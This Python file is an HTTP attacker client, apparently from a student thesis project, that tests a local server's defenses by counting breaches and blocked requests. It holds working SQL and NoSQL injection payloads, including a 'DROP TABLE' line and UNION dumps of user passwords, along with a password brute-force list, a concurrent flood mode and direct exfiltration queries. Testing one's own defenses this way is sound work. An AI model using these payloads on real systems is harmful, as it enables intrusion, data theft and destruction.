"""Cliente HTTP atacante. Faz requests reais contra o server.py.

Modos:
  sqli          — SQL injection contra Postgres /pg/login e /pg/search
  nosqli        — NoSQL injection contra Mongo /mongo/login e /mongo/find
  brute-force   — Tenta múltiplas senhas no /pg/login
  ddos          — Volume alto de requests concorrentes
  exfil         — Tenta dump completo via /pg/query
  privesc       — User comum tenta acessar tabela sensível
  full          — Roda todos sequencialmente

Uso:
  python -m access_defense.attacker --mode sqli
  python -m access_defense.attacker --mode brute-force --rounds 50
  python -m access_defense.attacker --mode ddos --concurrency 20 --requests 200
  python -m access_defense.attacker --target http://localhost:8000 --mode full
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import time
from dataclasses import dataclass, field
from typing import Any

import requests


DEFAULT_TARGET = "http://localhost:8000"


@dataclass
class AttackReport:
    mode: str
    requests_sent: int = 0
    successful_breaches: int = 0
    blocked_by_defense: int = 0
    errors: int = 0
    samples: list[dict[str, Any]] = field(default_factory=list)
    duration_s: float = 0.0


# ============================================================================
# PAYLOADS
# ============================================================================

SQLI_LOGIN_PAYLOADS = [
    {"username": "admin' --", "password": "qualquer"},
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "admin", "password": "' OR '1'='1' --"},
    {"username": "' UNION SELECT 1,'pwned','admin' --", "password": "x"},
]

SQLI_SEARCH_PAYLOADS = [
    "' UNION SELECT id, username, password, role, NULL FROM users --",
    "' OR 1=1 --",
    "'; DROP TABLE clientes; --",
    "' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables --",
]

EXFIL_QUERIES = [
    "SELECT username, password, role FROM users",
    "SELECT * FROM salarios",
    "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
]

NOSQLI_LOGIN_PAYLOADS = [
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": "admin", "password": {"$ne": "wrong"}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
]

NOSQLI_FIND_PAYLOADS = [
    {"collection": "users", "filter": {"$where": "true"}},
    {"collection": "users", "filter": {"role": {"$ne": "nobody"}}},
    {"collection": "salarios", "filter": {"salario": {"$gt": 0}}},
]

BRUTE_FORCE_PASSWORDS = [
    "123456", "password", "admin", "admin123", "qwerty",
    "letmein", "welcome", "root", "toor", "12345",
    "iloveyou", "monkey", "dragon", "test", "guest",
    "analista", "analista123", "auditor", "auditor123",
]


# ============================================================================
# CORE
# ============================================================================


def _post(target: str, path: str, payload: dict, timeout: float = 5.0) -> dict | None:
    try:
        r = requests.post(target + path, json=payload, timeout=timeout)
        if r.status_code == 403:
            return {"_blocked": True, "status": 403, "body": r.json()}
        return {"status": r.status_code, "body": r.json()}
    except Exception as exc:
        return {"_error": str(exc)}


def _get(target: str, path: str, params: dict, timeout: float = 5.0) -> dict | None:
    try:
        r = requests.get(target + path, params=params, timeout=timeout)
        if r.status_code == 403:
            return {"_blocked": True, "status": 403, "body": r.json()}
        return {"status": r.status_code, "body": r.json()}
    except Exception as exc:
        return {"_error": str(exc)}


def _tally(report: AttackReport, response: dict | None, success_pred):
    report.requests_sent += 1
    if response is None or "_error" in (response or {}):
        report.errors += 1
        return
    if response.get("_blocked"):
        report.blocked_by_defense += 1
        return
    body = response.get("body", {})
    if success_pred(body):
        report.successful_breaches += 1
        if len(report.samples) < 5:
            report.samples.append(_truncate(body))


def _truncate(body: dict) -> dict:
    out = dict(body)
    if "rows" in out and isinstance(out["rows"], list):
        out["rows"] = out["rows"][:3]
    return out


# ============================================================================
# MODOS
# ============================================================================


def attack_sqli(target: str) -> AttackReport:
    report = AttackReport(mode="sqli")
    started = time.perf_counter()

    for payload in SQLI_LOGIN_PAYLOADS:
        resp = _post(target, "/pg/login", payload)
        _tally(report, resp, lambda b: b.get("authenticated") is True or len(b.get("rows", [])) > 0)

    for payload in SQLI_SEARCH_PAYLOADS:
        resp = _get(target, "/pg/search", {"table": "clientes", "q": payload})
        _tally(report, resp, lambda b: len(b.get("rows", [])) > 5)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


def attack_nosqli(target: str) -> AttackReport:
    report = AttackReport(mode="nosqli")
    started = time.perf_counter()

    for payload in NOSQLI_LOGIN_PAYLOADS:
        resp = _post(target, "/mongo/login", payload)
        _tally(report, resp, lambda b: b.get("authenticated") is True)

    for payload in NOSQLI_FIND_PAYLOADS:
        resp = _post(target, "/mongo/find", payload)
        _tally(report, resp, lambda b: len(b.get("rows", [])) > 0)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


def attack_brute_force(target: str, rounds: int = 20, user: str = "admin") -> AttackReport:
    report = AttackReport(mode="brute-force")
    started = time.perf_counter()

    passwords = (BRUTE_FORCE_PASSWORDS * (rounds // len(BRUTE_FORCE_PASSWORDS) + 1))[:rounds]
    for pwd in passwords:
        resp = _post(target, "/pg/login", {"username": user, "password": pwd})
        _tally(report, resp, lambda b: b.get("authenticated") is True)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


def attack_ddos(target: str, total_requests: int = 200, concurrency: int = 20) -> AttackReport:
    report = AttackReport(mode="ddos")
    started = time.perf_counter()

    def hit(_i):
        return _get(target, "/pg/search", {"table": "clientes", "q": "a"})

    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
        for resp in pool.map(hit, range(total_requests)):
            _tally(report, resp, lambda b: len(b.get("rows", [])) >= 0)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


def attack_exfil(target: str) -> AttackReport:
    report = AttackReport(mode="exfil")
    started = time.perf_counter()

    for sql in EXFIL_QUERIES:
        resp = _post(target, "/pg/query", {"sql": sql})
        _tally(report, resp, lambda b: len(b.get("rows", [])) > 0)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


def attack_privesc(target: str) -> AttackReport:
    report = AttackReport(mode="privesc")
    started = time.perf_counter()

    # user comum tenta ler salarios
    resp = _get(target, "/pg/search", {"table": "salarios", "q": "", "user": "joao"})
    _tally(report, resp, lambda b: len(b.get("rows", [])) > 0)
    # depois com nome de coluna
    resp = _get(target, "/pg/search", {"table": "salarios", "q": "%", "user": "joao"})
    _tally(report, resp, lambda b: len(b.get("rows", [])) > 0)

    report.duration_s = round(time.perf_counter() - started, 3)
    return report


# ============================================================================
# CLI
# ============================================================================


MODES = {
    "sqli": attack_sqli,
    "nosqli": attack_nosqli,
    "brute-force": lambda t: attack_brute_force(t),
    "ddos": lambda t: attack_ddos(t),
    "exfil": attack_exfil,
    "privesc": attack_privesc,
}


def main():
    parser = argparse.ArgumentParser(description="Atacante HTTP do TCC.")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument(
        "--mode",
        choices=list(MODES.keys()) + ["full"],
        default="full",
    )
    parser.add_argument("--rounds", type=int, default=20)
    parser.add_argument("--requests", type=int, default=200)
    parser.add_argument("--concurrency", type=int, default=20)
    args = parser.parse_args()

    if args.mode == "full":
        reports = [fn(args.target) for fn in MODES.values()]
    elif args.mode == "brute-force":
        reports = [attack_brute_force(args.target, rounds=args.rounds)]
    elif args.mode == "ddos":
        reports = [attack_ddos(args.target, total_requests=args.requests, concurrency=args.concurrency)]
    else:
        reports = [MODES[args.mode](args.target)]

    print(json.dumps([r.__dict__ for r in reports], indent=2, default=str))


if __name__ == "__main__":
    main()
